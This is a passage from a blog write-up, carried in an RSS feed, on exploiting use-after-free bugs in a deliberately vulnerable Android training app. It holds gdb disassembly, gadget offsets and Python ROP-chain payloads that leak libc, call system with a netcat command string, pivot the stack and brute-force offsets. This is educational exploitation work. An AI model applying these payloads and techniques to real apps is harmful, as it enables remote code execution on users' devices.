+&lt;pre tabindex="0">&lt;code>/com.damnvulnerableapp W/Thread-2: type=1400 audit(0.0:3799): avc: denied { execute } for name=&amp;quot;client&amp;quot; dev=&amp;quot;dm-5&amp;quot; ino=65602 scontext=u:r:untrusted_app:s0:c152,c256,c512,c768 tcontext=u:object_r:shell_data_file:s0 tclass=file permissive=0 app=com.damnvulnerableapp
+&lt;/code>&lt;/pre>&lt;h3 id="trying-to-earn-all-the-fruits">Trying to earn all the fruits&lt;/h3>
+&lt;p>As you may have noticed, the above does not really help other than crashing the app. What we want is &lt;strong>arbitrary code execution&lt;/strong>!!! Thus, we can try to transform the above UAF vulnerability into another vulnerability, e.g. a format string vulnerability that is easier to exploit!&lt;/p>
+&lt;p>Observe that there is a function called &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:system/libbase/stringprintf.cpp;l=68">&lt;code>StringPrintf&lt;/code>&lt;/a>:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C++" data-lang="C++">std&lt;span style="color:#f92672">::&lt;/span>string StringPrintf(&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span>&lt;span style="color:#f92672">*&lt;/span> fmt, ...) {
+va_list ap;
+va_start(ap, fmt);
+std&lt;span style="color:#f92672">::&lt;/span>string result;
+StringAppendV(&lt;span style="color:#f92672">&amp;amp;&lt;/span>result, fmt, ap);
+va_end(ap);
+&lt;span style="color:#66d9ef">return&lt;/span> result;
+}
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>which is a perfect target as we fully control the content of &lt;code>key&lt;/code>! Using the same trick as above or by just disassembling the whole &lt;code>.plt&lt;/code> and searching for &lt;code>StringPrintf&lt;/code> will reveal that its offset is &lt;code>0xa08570&lt;/code> (in &lt;code>.plt&lt;/code>). Notice that &lt;code>StringPrintf&lt;/code> internally calls &lt;code>StringAppendV&lt;/code>, which again calls &lt;code>vsnprintf&lt;/code>.&lt;/p>
+&lt;p>Therefore, set &lt;code>key=&amp;lt;format string&amp;gt;&lt;/code> and &lt;code>value=address of StringPrintf@plt&lt;/code>.&lt;/p>
+&lt;p>Testing this reveals that we might be able to use format strings like &amp;ldquo;%4242x&amp;rdquo;, but not &amp;ldquo;%4242x%n&amp;rdquo;, because of the implementation of &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:bionic/libc/stdio/vfprintf.cpp;l=454;bpv=0;bpt=1">&lt;code>vfprintf&lt;/code>&lt;/a>:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C" data-lang="C">...
+&lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#e6db74">&amp;#39;n&amp;#39;&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
+__fortify_fatal(&lt;span style="color:#e6db74">&amp;#34;%%n not allowed on Android&amp;#34;&lt;/span>);
+...
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>Also, for the above to work, we would need to adjust the call to &lt;code>obj + 0x100&lt;/code> like:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C" data-lang="C">&lt;span style="color:#66d9ef">char&lt;/span> buffer[&lt;span style="color:#ae81ff">32&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> { &lt;span style="color:#ae81ff">0&lt;/span> };
+&lt;span style="color:#f92672">*&lt;/span>(obj &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x100&lt;/span>)(buffer, keyValue);
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>because &lt;code>StringPrintf&lt;/code> silently assumes that &lt;code>rdi&lt;/code> is an address to a variable that has to store a result of &lt;code>24&lt;/code> bytes and &lt;code>rsi&lt;/code> is the format string. If we did not make the above change, then &lt;code>StringPrintf&lt;/code> would zero out the first &lt;code>24&lt;/code> bytes of our format string, thus completely shutting down the attack. Adding to the pile, we do not have any control over addresses that are accessible via direct parameter access. To be precise, we would need to be lucky enough to find any addresses of interest on the stack like e.g. the format string itself.&lt;/p>
+&lt;p>Another idea could be to call &lt;code>dlopen&lt;/code> to get a reference to another library that provides more interesting functionality like &lt;code>system&lt;/code>! The offset of the &lt;code>.plt&lt;/code> - entry that calls &lt;code>dlopen&lt;/code> is &lt;code>0xa096b0&lt;/code>. Thus we can compute the overall virtual address. Unfortunately, this is shut down by the fact that &lt;code>dlopen&lt;/code> returns a random &lt;code>8&lt;/code> - byte value that is a key into a dictionary, whose values are the actual addresses of &lt;code>soinfo&lt;/code> - structures, which again contain the base addresses. So it is pretty unlikely to get this right, the best we could do here is either guessing or trying to leak the dictionary via a global variable.&lt;/p>
+&lt;h3 id="finally-the-solution">Finally: the solution&lt;/h3>
+&lt;p>Another approach is to try to exploit this UAF vulnerability via a ROP - chain. This is a very destructive approach, but lets see through this:&lt;/p>
+&lt;ol>
+&lt;li>Find a gadget that, right before the call of our &lt;code>obj + 0x100&lt;/code> function, modifies the stack in such a way that it will return to &lt;code>keyValue&lt;/code>.&lt;/li>
+&lt;li>Put ROP - chain into &lt;code>keyValue&lt;/code>. We may use at most &lt;code>256 // 8 = 32&lt;/code> qwords. This might be sufficient to leak a &lt;code>libc.so&lt;/code> address into a global variable in &lt;code>libart.so&lt;/code>. It will turn out that this even suffices to get arbitrary, limited - length command execution.&lt;/li>
+&lt;li>Finally restore the old &lt;code>rsp&lt;/code> and &lt;code>rbp&lt;/code>. This would be necessary for a stealthy approach. Restoring &lt;code>rsp&lt;/code> is only really important for calling &lt;code>system&lt;/code>, because if &lt;code>rsp&lt;/code> points into &lt;code>keyValue&lt;/code>, which is located on the heap, &lt;code>system&lt;/code> will allocate alot of memory from the heap as if it was a stack, therefore going out-of-bounds fast.&lt;/li>
+&lt;/ol>
+&lt;p>So, the gadget of choice is located at &lt;code>0x39509a&lt;/code> and is of the form:&lt;/p>
+&lt;pre tabindex="0">&lt;code>gef➤ x/10i 0x730c03400000 + 0x39509a
+0x730c0379509a &amp;lt;art_quick_do_long_jump+106&amp;gt;: pop rdi
+0x730c0379509b &amp;lt;art_quick_do_long_jump+107&amp;gt;: pop rsi
+0x730c0379509c &amp;lt;art_quick_do_long_jump+108&amp;gt;: pop rbp
+0x730c0379509d &amp;lt;art_quick_do_long_jump+109&amp;gt;: add rsp,0x8
+0x730c037950a1 &amp;lt;art_quick_do_long_jump+113&amp;gt;: pop rbx
+0x730c037950a2 &amp;lt;art_quick_do_long_jump+114&amp;gt;: pop rdx
+0x730c037950a3 &amp;lt;art_quick_do_long_jump+115&amp;gt;: pop rcx
+0x730c037950a4 &amp;lt;art_quick_do_long_jump+116&amp;gt;: pop rax
+0x730c037950a5 &amp;lt;art_quick_do_long_jump+117&amp;gt;: pop rsp
+0x730c037950a6 &amp;lt;art_quick_do_long_jump+118&amp;gt;: ret
+&lt;/code>&lt;/pre>&lt;p>We can use the debugger to figure out how many qwords we need to pop in order for the &lt;code>ret&lt;/code> - instruction to return to &lt;code>keyValue&lt;/code>:&lt;/p>
+&lt;pre tabindex="0">&lt;code>gef➤ disassemble Java_com_damnvulnerableapp_vulnerable_modules_UseAfterFreeExecModule_storePair
+...
+0x0000730b9d3c8b5c &amp;lt;+252&amp;gt;: mov rax,QWORD PTR [rbp-0x70]
+0x0000730b9d3c8b60 &amp;lt;+256&amp;gt;: mov rax,QWORD PTR [rax+0x100]
+0x0000730b9d3c8b67 &amp;lt;+263&amp;gt;: mov rdi,QWORD PTR [rbp-0x78] &amp;lt;--- keyValue
+0x0000730b9d3c8b6b &amp;lt;+267&amp;gt;: xor ecx,ecx
+0x0000730b9d3c8b6d &amp;lt;+269&amp;gt;: mov DWORD PTR [rbp-0xac],ecx
+0x0000730b9d3c8b73 &amp;lt;+275&amp;gt;: mov esi,ecx
+=&amp;gt; 0x0000730b9d3c8b75 &amp;lt;+277&amp;gt;: call rax &amp;lt;--- execution condition
+...
+gef➤ x/1gx $rbp-0x78
+0x730b9afdf818: 0x0000730cb77bb950
+gef➤ x/10gx $rsp
+0x730b9afdf7e0: 0x00000000990de82b 0x0000730d778087d0
+0x730b9afdf7f0: 0x0000730b9afdfb00 0x0000730d77808880
+0x730b9afdf800: 0x0000730b9afdfd60 0x0000730ca77f2750
+0x730b9afdf810: 0x000000d09afdf8b0 0x0000730cb77bb950 &amp;lt;--- this is keyValue
+0x730b9afdf820: 0x0000730cb77bb950 0x0000730c0379509c
+&lt;/code>&lt;/pre>&lt;p>So when we run into &lt;code>call rax&lt;/code>, we push an additional return address onto the stack. Therefore we need to pop &lt;code>1 + 7&lt;/code> qwords from the stack before we can shift the stack into &lt;code>keyValue&lt;/code> and hit &lt;code>ret&lt;/code>. So we need &lt;code>rsp&lt;/code> to be &lt;code>keyValue&lt;/code>, then the stack &amp;ldquo;changes&amp;rdquo; to our controlled ROP - chain. Therefore we can make use the &lt;em>Execute&lt;/em> condition to run the above gadget, which will then trigger execution of the gadgets located in &lt;code>keyValue&lt;/code>.&lt;/p>
+&lt;p>Now we will try to leak a &lt;code>libc.so&lt;/code> address into a global variable in &lt;code>libart.so&lt;/code>. This allows us to compute the &lt;code>libc.so&lt;/code> base address, which in turn allows us to call &lt;code>system&lt;/code> (the holy grail)! To that end, we will try to find a &lt;code>libc.so&lt;/code> address in &lt;code>libart.so&lt;/code>. The &lt;code>.got.plt&lt;/code> is the best place to start looking. As Android&amp;rsquo;s dynamic linker likes loading shared objects with &lt;code>BIND_NOW&lt;/code> (which is probably motivated by &lt;em>RELRO&lt;/em>), the &lt;code>.got.plt&lt;/code> is already populated with the correct function addresses. This implies that the &lt;code>.got.plt&lt;/code> entry of &lt;code>_exit&lt;/code> contains the actual address of &lt;code>_exit&lt;/code> in the &lt;code>libc.so&lt;/code>. Computing the offset of &lt;code>_exit&lt;/code>&amp;rsquo;s &lt;code>.got.plt&lt;/code> entry yields &lt;code>0xc1be50&lt;/code> (we could use any other function from &lt;code>libc.so&lt;/code>; &lt;code>_exit&lt;/code> was chosen arbitrarily).&lt;/p>
+&lt;p>Observe that we only need 6 qwords to leak &lt;code>system&lt;/code>:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># Leak exit@libc into rax&lt;/span>
+payload &lt;span style="color:#f92672">+=&lt;/span> gadget_pop_rdi
+payload &lt;span style="color:#f92672">+=&lt;/span> address_got_plt_exit
+payload &lt;span style="color:#f92672">+=&lt;/span> gadget_mov_rax_deref_rdi
+&lt;span style="color:#75715e"># Put system@libc into rax&lt;/span>
+payload &lt;span style="color:#f92672">+=&lt;/span> gadget_pop_rcx
+payload &lt;span style="color:#f92672">+=&lt;/span> p64(offset__exit &lt;span style="color:#f92672">-&lt;/span> offset_system) &lt;span style="color:#75715e"># --&amp;gt; offset__exit &amp;gt;= offset_system (just testing)&lt;/span>
+payload &lt;span style="color:#f92672">+=&lt;/span> gadget_sub_rax_rcx
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>After the above, &lt;code>rax&lt;/code> will contain the address of &lt;code>system@libc&lt;/code>. Setting up the command to execute can be done by writing to a writable memory area in &lt;code>libart.so&lt;/code> (hope that this does not crash; otherwise choose another area until it works). Writing the command could look like this:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">payload &lt;span style="color:#f92672">+=&lt;/span> gadget_pop_rdi
+payload &lt;span style="color:#f92672">+=&lt;/span> address_writable_memory
+payload &lt;span style="color:#f92672">+=&lt;/span> gadget_pop_rcx
+payload &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;nc 10.0.&amp;#39;&lt;/span>
+payload &lt;span style="color:#f92672">+=&lt;/span> gadget_mov_deref_rdi_rcx
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>Finally, we want to call &lt;code>system@libc&lt;/code>, whose address is stored in &lt;code>rax&lt;/code>. The main problem here is that just calling &lt;code>system&lt;/code> will most likely crash the app, because &lt;code>rsp&lt;/code> still points into the heap. If &lt;code>system&lt;/code> uses a lot of stack memory, this will eventually invalidate heap chunks or trigger &lt;em>anti - out - of - bounds&lt;/em> security mechanisms. Therefore, we need to restore &lt;code>rsp&lt;/code> s.t. it points into a sufficiently large memory area that is assumed to be used by &amp;ldquo;user - code&amp;rdquo;, i.e. e.g. the original stack. Observe that the &lt;a href="#leaking-data">leaked addresses&lt;/a> contained a stack pointer. We can go ahead and write the address of &lt;code>system@libc&lt;/code> into that address and then restore the stack with a &lt;code>pop rsp; ret&lt;/code>:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># Write address of system@got.plt to stack address. rdi currently contains the command string!&lt;/span>
+payload &lt;span style="color:#f92672">+=&lt;/span> gadget_pop_rcx
+payload &lt;span style="color:#f92672">+=&lt;/span> address_stack
+payload &lt;span style="color:#f92672">+=&lt;/span> gadget_mov_deref_rcx_rax &lt;span style="color:#75715e"># &amp;lt;-- rax = system@libc&lt;/span>
+&lt;span style="color:#75715e"># Restore stack. This gadget implicitly calls system&lt;/span>
+payload &lt;span style="color:#f92672">+=&lt;/span> gadget_pop_rsp
+payload &lt;span style="color:#f92672">+=&lt;/span> address_stack
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>This exploit is &lt;strong>very&lt;/strong> specific to this module, but it uses a technique that shifts the stack into a user - controlled memory region s.t. successive &lt;code>ret&lt;/code> - instructions result in execution of ROP - gadgets.&lt;/p>
+&lt;h2 id="coming-back-from-useafterfreeexecmodule">Coming back from &lt;em>UseAfterFreeExecModule&lt;/em>&lt;/h2>
+&lt;p>The technique used to exploit the UAF vulnerability in the &lt;em>UseAfterFreeExecModule&lt;/em> might be applicable to &lt;em>libUseAfterFreeWriteModule&lt;/em> aswell. General steps are:&lt;/p>
+&lt;ol>
+&lt;li>Setup a ROP - chain in readable/writeable memory area. In this case, this will be in a shared memory region somewhere is &lt;code>libart.so&lt;/code>.&lt;/li>
+&lt;li>Next, overwrite &lt;code>rsp&lt;/code> to point to the above mentioned memory region. Then immediately return using &lt;code>ret&lt;/code>.&lt;/li>
+&lt;li>Enjoy the ROP - chain&lt;/li>
+&lt;/ol>
+&lt;p>It turns out that this does not work by itself. As we can only write one qword in each function call, we can either overwrite the return address to trigger execution of e.g. a gadget or set the stack pointer, but &lt;strong>not&lt;/strong> both at once. Therefore, we need to do a little magic to make things work.&lt;/p>
+&lt;p>The key observation is that &lt;code>rbp&lt;/code> is often used to restore &lt;code>rsp&lt;/code> in function epilogues. This is precisely what happens in the caller of &lt;code>storePair&lt;/code>! See the following assembly of &lt;code>storePair&lt;/code>:&lt;/p>
+&lt;pre tabindex="0">&lt;code>gef➤ disassemble Java_com_damnvulnerableapp_vulnerable_modules_UseAfterFreeWriteModule_storePair
+...
+0x0000730b9ed59abd &amp;lt;+205&amp;gt;: mov rcx,QWORD PTR [rbp-0x50]
+0x0000730b9ed59ac1 &amp;lt;+209&amp;gt;: mov rax,QWORD PTR [rbp-0x58]
+0x0000730b9ed59ac5 &amp;lt;+213&amp;gt;: mov rax,QWORD PTR [rax]
+0x0000730b9ed59ac8 &amp;lt;+216&amp;gt;: mov QWORD PTR [rax],rcx &amp;lt;--- write - what - where condition
+0x0000730b9ed59acb &amp;lt;+219&amp;gt;: mov rdi,QWORD PTR [rbp-0x38]
+0x0000730b9ed59acf &amp;lt;+223&amp;gt;: mov rax,QWORD PTR [rdi]
+0x0000730b9ed59ad2 &amp;lt;+226&amp;gt;: mov rax,QWORD PTR [rax+0x600]
+0x0000730b9ed59ad9 &amp;lt;+233&amp;gt;: mov rsi,QWORD PTR [rbp-0x48]
+0x0000730b9ed59add &amp;lt;+237&amp;gt;: mov rdx,QWORD PTR [rbp-0x70]
+0x0000730b9ed59ae1 &amp;lt;+241&amp;gt;: mov ecx,0x2
+0x0000730b9ed59ae6 &amp;lt;+246&amp;gt;: call rax
+0x0000730b9ed59ae8 &amp;lt;+248&amp;gt;: mov rdi,QWORD PTR [rbp-0x60]
+0x0000730b9ed59aec &amp;lt;+252&amp;gt;: call 0x730b9ed59b90 &amp;lt;free@plt&amp;gt;
+0x0000730b9ed59af1 &amp;lt;+257&amp;gt;: mov rax,QWORD PTR fs:0x28
+0x0000730b9ed59afa &amp;lt;+266&amp;gt;: mov rcx,QWORD PTR [rbp-0x8]
+0x0000730b9ed59afe &amp;lt;+270&amp;gt;: cmp rax,rcx
+0x0000730b9ed59b01 &amp;lt;+273&amp;gt;: jne 0x730b9ed59b0d &amp;lt;Java_com_damnvulnerableapp_vulnerable_modules_UseAfterFreeWriteModule_storePair+285&amp;gt;
+0x0000730b9ed59b07 &amp;lt;+279&amp;gt;: add rsp,0x70
+0x0000730b9ed59b0b &amp;lt;+283&amp;gt;: pop rbp &amp;lt;--- restore old rbp of calling function
+0x0000730b9ed59b0c &amp;lt;+284&amp;gt;: ret
+&lt;/code>&lt;/pre>&lt;p>It is clear that in between the &lt;em>Write - What - Where&lt;/em> condition and the &lt;code>pop rbp&lt;/code> - instruction there are no references to the stored old &lt;code>rbp&lt;/code> of the calling function. Therefore, we can &amp;ldquo;safely&amp;rdquo; overwrite it. But why would we do this? Consider what happens after we return from &lt;code>storePair&lt;/code>:&lt;/p>
+&lt;pre tabindex="0">&lt;code>gef➤ x/35i 0x0000730c0379ffa9
+0x730c0379ffa9: call r11
+0x730c0379ffac: mov rdi,QWORD PTR gs:0xe0 &amp;lt;--- we return here
+0x730c0379ffb5: mov rsi,rax
+0x730c0379ffb8: movq rdx,xmm0
+0x730c0379ffbd: call 0x730c03d62b00 &amp;lt;artInvokeInterfaceTrampolineWithAccessCheck+208&amp;gt;
+0x730c0379ffc2: mov rcx,QWORD PTR gs:0xa0
+0x730c0379ffcb: test rcx,rcx
+0x730c0379ffce: jne 0x730c037a0034 &amp;lt;art_quick_read_barrier_mark_reg02+116&amp;gt;
+0x730c0379ffd0: mov rsp,rbp &amp;lt;--- how convenient!
+0x730c0379ffd3: movq xmm1,QWORD PTR [rsp+0x18]
+0x730c0379ffd9: movq xmm2,QWORD PTR [rsp+0x20]
+0x730c0379ffdf: movq xmm3,QWORD PTR [rsp+0x28]
+0x730c0379ffe5: movq xmm4,QWORD PTR [rsp+0x30]
+0x730c0379ffeb: movq xmm5,QWORD PTR [rsp+0x38]
+0x730c0379fff1: movq xmm6,QWORD PTR [rsp+0x40]
+0x730c0379fff7: movq xmm7,QWORD PTR [rsp+0x48]
+0x730c0379fffd: movq xmm12,QWORD PTR [rsp+0x50]
+0x730c037a0004: movq xmm13,QWORD PTR [rsp+0x58]
+0x730c037a000b: movq xmm14,QWORD PTR [rsp+0x60]
+0x730c037a0012: movq xmm15,QWORD PTR [rsp+0x68]
+0x730c037a0019: add rsp,0x70
+0x730c037a001d: pop rcx
+0x730c037a001e: pop rdx
+0x730c037a001f: pop rbx
+0x730c037a0020: pop rbp
+0x730c037a0021: pop rsi
+0x730c037a0022: pop r8
+0x730c037a0024: pop r9
+0x730c037a0026: pop r12
+0x730c037a0028: pop r13
+0x730c037a002a: pop r14
+0x730c037a002c: pop r15
+0x730c037a002e: movq xmm0,rax
+0x730c037a0033: ret
+&lt;/code>&lt;/pre>&lt;p>So if we were to pass the function call &lt;code>call 0x730c03d62b00&lt;/code> and &lt;code>rcx = 0&lt;/code>, then we reach &lt;code>mov rsp, rbp&lt;/code>, where &lt;code>rbp&lt;/code> can be a value of our choice if we decide to overwrite the old rbp! After &lt;code>rsp&lt;/code> has been set, we can see that we have a lot of references to &lt;code>rsp&lt;/code> in order to restore the registers. So in addition to our ROP - chain, we need to ensure that there is a region of size &lt;code>0x70 + 11 * 0x8&lt;/code> of accessible memory. The content of the accessible memory region can be anything, although we could use it to make an initial setup for the registers. Right after that region, we can place our ROP - chain, as &lt;code>rsp&lt;/code> will point to &lt;code>rbp + 0x70 + 11 * 0x8 = rbp + 0xc8&lt;/code>. Once we hit the ROP - chain, we can continue as usual in order to set up a command for &lt;code>system&lt;/code> etc.&lt;/p>
+&lt;p>Once we want to call &lt;code>system&lt;/code> we need to restore the stack in order to make segmentation faults etc. less likely (remember that &lt;code>rsp&lt;/code> is currently pointing to some globally accessible memory region, e.g. &lt;code>.bss&lt;/code>. We do &lt;strong>not&lt;/strong> want our stack to be there forever!). To that end we write the address of &lt;code>system&lt;/code> to the stack pointer that was leaked by &lt;code>lookupExamples&lt;/code>, set &lt;code>rsp&lt;/code> to that address and call &lt;code>pop rsp; ret&lt;/code>:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># Up to this point, rsp still points into .bss! This will most likely crash the app while calling system! Thus try to reset rsp by abusing the stack pointer leak. We will set rsp to the leaked address, but before we will set the stack value at that leaked address to system@libc! Thus we can use a pop rsp; ret gadget.&lt;/span>
+&lt;span style="color:#75715e"># Write address of system@got.plt to stack address. rdi currently contains the command string!&lt;/span>
+payload &lt;span style="color:#f92672">+=&lt;/span> gadget_pop_rcx
+payload &lt;span style="color:#f92672">+=&lt;/span> address_stack
+payload &lt;span style="color:#f92672">+=&lt;/span> gadget_mov_deref_rcx_rax
+&lt;span style="color:#75715e"># Restore stack&lt;/span>
+payload &lt;span style="color:#f92672">+=&lt;/span> gadget_pop_rsp
+payload &lt;span style="color:#f92672">+=&lt;/span> address_stack
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>There is only one problem remaining, i.e. when monitoring the exploit with &lt;em>gdb&lt;/em>, we can observe that the ROP - chain might execute perfectly fine. But if we try to run the exploit without any debugger attached, it most likely does not work (at least in my case). There may be multiple reasons for that, among which the most probable ones are:&lt;/p>
+&lt;ol>
+&lt;li>&lt;em>gdb&lt;/em> shifts the stack, because it stores debug information or similar&lt;/li>
+&lt;li>&lt;em>gdb&lt;/em> prevents the app from using certain global variables s.t. overwriting them with &lt;em>gdb&lt;/em> attached results in no error.&lt;/li>
+&lt;/ol>
+&lt;p>It turns out that the first hypothesis is most likely true! To that end, we can try to brute - force over a finite set of possible stack shifts like so:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">address_old_rbp &lt;span style="color:#f92672">=&lt;/span> p64(u64(leak[&lt;span style="color:#ae81ff">4&lt;/span>]) &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">0x240&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x8&lt;/span> &lt;span style="color:#f92672">*&lt;/span> (rbp_shift))
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>where&lt;/p>
+&lt;ul>
+&lt;li>&lt;code>leak[4]&lt;/code> is the stack address leak&lt;/li>
+&lt;li>&lt;code>- 0x240&lt;/code> is the offset of the leaked stack address to the address of the old &lt;code>rbp&lt;/code> when &lt;em>gdb&lt;/em> is attached&lt;/li>
+&lt;li>&lt;code>+ 0x8 * rbp_shift&lt;/code> shift to try for this run of the exploit. As we are &amp;ldquo;missing&amp;rdquo; &lt;em>gdb&lt;/em>, it is very probable that there is less data on the stack, thus we increment the stack address.&lt;/li>
+&lt;/ul>
+&lt;p>A big problem could be that both of the above reasons are true. Thus, minizing the ROP - chain we write into global memory can be very helpful to rule out the second reason as much as possible. E.g. we could use a ROP - chain that just calls &lt;code>sleep(42)&lt;/code>. Then brute - force over all shifts until the app blocks. The shift that caused a block (longer than usual execution times, i.e. it might not block for all &lt;code>42&lt;/code> seconds, because other threads might try to use overwritten global variables, which probably crashes the app!) is most likely the shift we were looking for.&lt;/p>
+&lt;h2 id="summary">Summary&lt;/h2>
+&lt;p>It has been a long journey to get to &lt;em>arbitrary code execution&lt;/em>, but in the end it worked! We abused the fact that there are no bounds checks for &lt;code>rsp&lt;/code>, which allowed for redirecting the stack into attacker - controlled memory regions. This again triggered the execution of a ROP - chain.&lt;/p>
+&lt;p>An upgrade to the above attack would be to use a single ROP - chain that triggers execution of &lt;code>mmap&lt;/code> and stores the result in a writable memory region. Then, using the &lt;em>Write - What - Where&lt;/em> condition, we could fill the new memory region with arbitrary shellcode. Finally, we can overwrite the return address to redirect control flow into the shellcode.&lt;/p></content></item></channel></rss>
